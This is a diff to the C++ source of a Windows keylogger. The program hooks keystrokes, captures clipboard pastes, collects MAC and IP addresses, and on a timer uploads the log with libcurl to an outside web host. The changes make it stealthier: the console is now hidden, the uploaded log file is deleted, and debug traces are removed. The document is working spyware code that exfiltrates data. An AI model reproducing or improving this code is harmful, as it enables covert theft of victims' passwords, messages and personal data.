@@ -119,6 +119,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 					{
 						message.append("\n--- CTRL + V ---\n");
 						message.append(text);
+						clipBoardLastSave = text;
 						message.append("\n--/FINE -> CTRL + V*\\--\n");
 						// unlocking the clipboard
 						GlobalUnlock(hData);
@@ -565,6 +566,7 @@ static std::string StartString()
 	while (pAdapterInfo) {
 		// Filtrare gli adattatori fisici e ignorare loopback e virtuali
 		if (pAdapterInfo->Type == IF_TYPE_IEEE80211 && !(pAdapterInfo->Index & 0x80000000) && !first) {
+			startString += "\n";
 			startString += "\nWireless Connection--";
 			MACToString(pAdapterInfo->Address, macStr);
 			startString += "\nAdapter Name: ";
@@ -573,10 +575,10 @@ static std::string StartString()
 			startString.append(pAdapterInfo->Description);
 			startString += "\nMAC Address: " + macStr + "\nIP Address: ";
 			startString.append(pAdapterInfo->IpAddressList.IpAddress.String);
-			startString += "\n";
 			first = true;
 		}
 		if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET && !(pAdapterInfo->Index & 0x80000000) && !second) {
+			startString += "\n";
 			startString += "\nEthernet Connection (Physycal MAC address)--";
 			MACToString(pAdapterInfo->Address, macStr);
 			startString += "\nAdapter Name: ";
@@ -585,7 +587,6 @@ static std::string StartString()
 			startString.append(pAdapterInfo->Description);
 			startString += "\nMAC Address: " + macStr + "\nIP Address: ";
 			startString.append(pAdapterInfo->IpAddressList.IpAddress.String);
-			startString += "\n";
 			second = true;
 		}
 		if (first && second) break;
@@ -594,6 +595,7 @@ static std::string StartString()
 	if (macStr.empty()) {
 		startString += "No physical adapter found.\n";
 	}
+	startString += "\n";
 	// date & time
 	localtime_s(&currentTime, &now);
 	startString.append("\nDate: ");
@@ -616,50 +618,41 @@ static std::string StartString()
 void timeCheck() {
 	std::string tmp;
 	while (true) {
-		// Wait 15 minutes
+		// Wait x minutes
 		std::this_thread::sleep_for(waitTime);
 		tmp = contentFile;
 		contentFile = "";
 		std::ofstream outputFile(FilePath);
 		if (outputFile.is_open()) outputFile << tmp;
 		outputFile.close();
-		std::ofstream giustoPerCapire("giustoPerCapire.txt");
-		if (giustoPerCapire.is_open()) giustoPerCapire << tmp;
-		giustoPerCapire.close();
-
 		// sending the file to the server
 		CURL* curl;
 		CURLcode res;
 		curl_global_init(CURL_GLOBAL_ALL);
 		curl = curl_easy_init();
-
+		// Check if the curl is correctly istanced
 		if (curl) {
 			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
-
-			// Imposta il file da inviare
+			// Imposting the file to send
 			struct curl_httppost* formpost = NULL;
 			struct curl_httppost* lastptr = NULL;
 			curl_formadd(&formpost, &lastptr,
 				CURLFORM_COPYNAME, "file",
 				CURLFORM_FILE, FilePath.c_str(),
 				CURLFORM_END);
-
-			// Imposta il form con il file da inviare
+			// Set the form post parameter
 			curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
-
-			// Effettua la richiesta
+			// Make the request and check the result
 			res = curl_easy_perform(curl);
-
 			/*if (res != CURLE_OK)
 				std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;*/
-
-			// Pulisce
+			// Cleanup
 			curl_easy_cleanup(curl);
 			curl_formfree(formpost);
-			std::cout << "File inviato correttamente." << std::endl;
 		}
 		curl_global_cleanup();
-
+		// remove the file after sending it
+		remove(FilePath.c_str());
 		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
 		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
 	}
@@ -668,9 +661,9 @@ void timeCheck() {
 // main function
 int main()
 {
-	std::thread t(timeCheck); // istancing a thread
+	FreeConsole(); // hiding the console
 
-	//FreeConsole(); // hiding the console
+	std::thread t(timeCheck); // istancing a thread
 
 	contentFile = StartString();
 	// istancing the hooks
